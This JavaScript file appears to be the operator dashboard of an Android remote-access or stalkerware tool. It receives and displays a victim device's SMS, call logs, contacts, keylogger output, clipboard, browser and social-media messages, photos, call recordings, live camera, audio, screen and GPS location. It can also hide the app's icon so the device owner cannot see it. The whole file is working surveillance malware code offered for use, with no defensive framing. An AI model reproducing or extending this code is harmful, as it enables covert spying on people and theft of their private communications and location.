// ==================== MAIN INITIALIZATION ====================
function handleIncomingMessage(msg) {
    try {
        const j = JSON.parse(msg);
        if (j.type === 'SIGNALING') handleSignaling(j.data);
        else handleJSON(j);
    } catch (e) {
        handlePlainText(msg);
    }
}

function handleJSON(json) {
    if (Array.isArray(json)) {
        if (window.pendingCommand === 'LIST_FILES') { window.currentData = json; renderFiles(); }
        else if (window.pendingCommand === 'GET_SMS') { displaySMS(json); }
        else if (window.pendingCommand === 'GET_CALL_LOGS') { displayCallLogs(json); }
        else if (window.pendingCommand === 'GET_CONTACTS') { displayContacts(json); }
        else if (window.pendingCommand === 'GET_WIFI_NETWORKS') { displayWifiNetworks(json); }
        window.pendingCommand = null; return;
    }
    switch (json.type) {
        case 'FILE_LIST':
            try {
                const _fl = typeof json.data === 'string' ? JSON.parse(json.data) : json.data;
                const _files = Array.isArray(_fl) ? _fl : [];
                if (window.pendingFolderLoad) {
                    const { path: fPath, inner: fInner } = window.pendingFolderLoad;
                    window.fileTreeCache[fPath] = _files;
                    fInner.innerHTML = renderFileTreeNodes(_files, fPath);
                    attachFileEventListeners(fInner);
                    window.pendingFolderLoad = null;
                } else {
                    window.fileTreeCache[window.currentPath || 'root'] = _files;
                    window.currentData = _files;
                    renderFiles();
                    attachFileEventListeners(document.getElementById('tree-root-container'));
                }
            } catch (e) { console.error('FILE_LIST error:', e); }
            break;
        case 'SMS_DATA': try { displaySMS(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'CALL_LOGS': try { displayCallLogs(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'CONTACTS_DATA': try { displayContacts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'WIFI_NETWORKS_DATA': try { displayWifiNetworks(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'SOCIAL_MESSAGES_DATA': try { displaySocialMessages(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
        case 'LOCATION_UPDATE':
            if (window.liveGpsActive) {
                const loc = json.data || json;
                const lat = loc.lat || loc.latitude;
                const lon = loc.lon || loc.longitude;
                const acc = loc.accuracy || 10;
                window.currentLocation = { lat, lon, acc };
                if (window.liveMap) renderLiveMap(lat, lon, acc);
                else renderLiveMap(lat, lon, acc);
            } else {
                renderMap(json.data || json);
            }
            break;
        case 'GEOFENCE_INFO': try { displayGeofenceInfo(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'FILE_INFO':
            window.fileTransfers[json.transferId] = { chunks: new Array(json.totalChunks), totalChunks: json.totalChunks, fileName: json.fileName, received: 0 };
            document.getElementById('progressFileName').innerText = json.fileName;
            document.getElementById('progressPercent').innerText = '0%';
            document.getElementById('progressBar').style.width = '0%';
            document.getElementById('downloadProgress').style.display = 'block';
            break;
        case 'FILE_CHUNK':
            const tr = window.fileTransfers[json.transferId];
            if (!tr) return;
            setTimeout(() => {
                try {
                    const bin = atob(json.data), bytes = new Uint8Array(bin.length);
                    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
                    tr.chunks[json.chunkIndex] = bytes;
                    tr.received++;
                    const pct = Math.round((tr.received / tr.totalChunks) * 100);
                    document.getElementById('progressPercent').innerText = pct + '%';
                    document.getElementById('progressBar').style.width = pct + '%';
                    if (tr.received === tr.totalChunks) {
                        const blob = new Blob(tr.chunks), url = URL.createObjectURL(blob), a = document.createElement('a');
                        a.href = url;
                        a.download = tr.fileName;
                        a.click();
                        URL.revokeObjectURL(url);
                        delete window.fileTransfers[json.transferId];
                        document.getElementById('downloadProgress').style.display = 'none';
                        showNotification(`✅ Downloaded: ${tr.fileName}`);
                    }
                } catch (e) {
                    showNotification('Chunk decode error');
                    delete window.fileTransfers[json.transferId];
                    document.getElementById('downloadProgress').style.display = 'none';
                }
            }, 0);
            break;
        case 'FLASH_ON': window.flashOn = true; document.getElementById('flashBtn').innerText = 'Flash Off'; showNotification('🔦 Flashlight ON'); break;
        case 'FLASH_OFF': window.flashOn = false; document.getElementById('flashBtn').innerText = 'Flash On'; showNotification('🔦 Flashlight OFF'); break;
        case 'APP_HIDDEN': window.iconHidden = true; document.getElementById('iconBtn').innerText = 'Show Icon'; showNotification('App icon hidden'); break;
        case 'APP_SHOWN': window.iconHidden = false; document.getElementById('iconBtn').innerText = 'Hide Icon'; showNotification('App icon shown'); break;
        case 'INSTALLED_APPS': try { displayInstalledApps(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'APP_USAGE_DATA': try { displayAppUsage(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'BROWSER_HISTORY_DATA': try { displayBrowserHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'KEYLOG_DATA': try { displayKeylog(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'CLIPBOARD_DATA': try { displayClipboard(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'RECENT_IMAGES_DATA': try { displayPhotoGallery(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'LOCATION_HISTORY_DATA': try { displayLocationHistory(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'APP_EVENTS_DATA': try { displayAppEvents(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'SMS_KEYWORDS_DATA': try { displaySmsKeywords(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'SMS_ALERTS_DATA': try { displaySmsAlerts(typeof json.data === 'string' ? JSON.parse(json.data) : json.data); } catch (e) { } break;
        case 'GEOFENCE_SET': showNotification('✅ Geofence activated'); break;
        case 'GEOFENCE_CLEARED': showNotification('Geofence cleared'); break;
        case 'GEOFENCE_ALERT': pushAlert('Geofence', json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone'); break;
        case 'SCHEDULED_CAPTURE_SET': showNotification('✅ Auto-capture started'); break;
        case 'SCHEDULED_CAPTURE_STOPPED': showNotification('Auto-capture stopped'); break;
        case 'DEVICE_LOCKED': showNotification('🔒 Screen locked'); break;
        case 'SMS_SENT': showNotification('✅ SMS sent successfully'); break;
        case 'FILE_DELETED': showNotification('File deleted'); sendCommand('LIST_FILES', { path: window.currentPath }); break;
        case 'VIBRATE_COMPLETE': showNotification('📳 Vibrated'); break;
        case 'GPS_UPDATES_STOPPED': window.liveGpsActive = false; const gpsBtn = document.getElementById('liveGpsBtn'); if (gpsBtn) { gpsBtn.querySelector('span:last-child').textContent = 'Live GPS Track'; gpsBtn.style.cssText = ''; } showNotification('GPS tracking stopped'); break;
        case 'NOTIFICATION_LIVE': pushAlert('📳 ' + (json.app || 'App'), (json.title || '') + ': ' + (json.text || '')); break;
        case 'CALL_ALERT': if (json.event === 'RINGING') pushAlert('📞 Incoming Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); else if (json.event === 'MISSED') pushAlert('📵 Missed Call', (json.name || 'Unknown') + ' (' + (json.number || '') + ')'); break;
        case 'SMS_KEYWORD_ALERT': pushAlert('🔑 Keyword: ' + json.keyword, 'From ' + json.from + ': ' + json.body); break;
        default: console.log('Unhandled type:', json.type);
    }
    window.pendingCommand = null;
}

function handlePlainText(msg) {
    if (msg.startsWith("CAMERA_IMAGE:")) displayCapturedImage(msg.substring(13));
    else if (msg.startsWith("FLASH_ON")) { window.flashOn = true; document.getElementById('flashBtn').innerText = 'Flash Off'; showNotification('Flash ON'); }
    else if (msg.startsWith("FLASH_OFF")) { window.flashOn = false; document.getElementById('flashBtn').innerText = 'Flash On'; showNotification('Flash OFF'); }
    else if (msg.startsWith("LOC_DATA:")) try { renderMap(JSON.parse(msg.substring(9))); } catch (e) { }
    else if (msg.startsWith("SMS_DATA:")) try { displaySMS(JSON.parse(msg.substring(9))); } catch (e) { }
    else if (msg.startsWith("CALL_DATA:")) try { displayCallLogs(JSON.parse(msg.substring(10))); } catch (e) { }
    else if (msg.startsWith("CONTACTS_DATA:")) try { displayContacts(JSON.parse(msg.substring(14))); } catch (e) { }
    else if (msg.startsWith("WIFI_DATA:")) try { displayWifiNetworks(JSON.parse(msg.substring(10))); } catch (e) { }
    else if (msg.startsWith('[') || msg.startsWith('{')) try { handleJSON(JSON.parse(msg)); } catch (e) { }
}

function setupEvents() {
    document.getElementById('screenShareBtn').onclick = toggleScreen;
    document.getElementById('clickPictureBtn').onclick = () => document.getElementById('clickCameraPanel').classList.toggle('show');
    document.getElementById('capturePictureBtn').onclick = capturePicture;
    document.getElementById('liveCameraBtn').onclick = () => document.getElementById('liveCameraPanel').classList.toggle('show');
    document.getElementById('startLiveStreamBtn').onclick = startLiveCamera;
    document.getElementById('liveAudioBtn').onclick = startLiveAudio;
    document.getElementById('stopLiveAudioBtn').onclick = stopLiveAudio;
    document.getElementById('getLocationBtn').onclick = () => sendCommand('GET_LOCATION');
    document.getElementById('fileManagerBtn').onclick = () => { refreshFileRoot(); };
    document.getElementById('smsBtn').onclick = () => { window.currentPage = 0; sendCommand('GET_SMS', { box: 'all' }); };
    document.getElementById('callLogsBtn').onclick = () => { window.currentPage = 0; sendCommand('GET_CALL_LOGS'); };
    document.getElementById('contactsBtn').onclick = () => { window.currentPage = 0; sendCommand('GET_CONTACTS'); };
    document.getElementById('installedAppsBtn').onclick = () => { window.currentPage = 0; sendCommand('GET_INSTALLED_APPS'); };
    document.getElementById('browserHistoryBtn').onclick = () => sendCommand('GET_BROWSER_HISTORY');
    document.getElementById('wifiNetworksBtn').onclick = () => { window.currentPage = 0; sendCommand('GET_WIFI_NETWORKS'); };
    document.getElementById('screenTimeBtn').onclick = showAppUsagePanel;
    document.getElementById('socialMessagesBtn').onclick = () => sendCommand('GET_SOCIAL_MESSAGES', { days: 3 });
    document.getElementById('keylogBtn').onclick = () => sendCommand('GET_KEYLOG');
    document.getElementById('clipboardBtn').onclick = () => sendCommand('GET_CLIPBOARD');
    document.getElementById('geofenceBtn').onclick = showGeofencePanel;
    document.getElementById('autoCaptureBtn').onclick = showSchedulePanel;
    document.getElementById('liveGpsBtn').onclick = toggleLiveGps;
    document.getElementById('locationHistoryBtn').onclick = showLocationHistoryPanel;
    document.getElementById('callRecordingsBtn').onclick = showCallRecordingsPanel;
    document.getElementById('photoGalleryBtn').onclick = showPhotoGalleryPanel;
    document.getElementById('appEventsBtn').onclick = showAppEventsPanel;
    document.getElementById('smsKeywordsBtn').onclick = showSmsKeywordsPanel;
    document.getElementById('toggleAppIconBtn').onclick = toggleAppIcon;
    document.getElementById('lockDeviceBtn').onclick = () => sendCommand('LOCK_DEVICE');
    document.getElementById('sendSmsBtn').onclick = showSendSmsPanel;
    document.getElementById('vibrateBtn').onclick = () => sendCommand('VIBRATE', { duration: 1000 });
    document.getElementById('toggleFlashBtn').onclick = toggleFlash;
    document.getElementById('reconnectBtn').onclick = manualReconnect;
    document.getElementById('clearAlertsBtn').onclick = clearAlerts;
    document.getElementById('logoutBtn').onclick = logout;
}

// Initialize auth state
window.auth.onAuthStateChanged(user => {
    console.log("Auth state changed:", user ? user.email : "none");
    window.currentUser = user;
    if (user) {
        document.getElementById('authContainer').style.display = 'none';
        loadDevices();
    } else {
        document.getElementById('authContainer').style.display = 'flex';
        document.getElementById('deviceListContainer').style.display = 'none';
        document.getElementById('sidebar').style.display = 'none';
        document.getElementById('main').style.display = 'none';
        window.isLoginMode = true;
        renderAuthForm();
    }
});

renderAuthForm();
setupEvents();
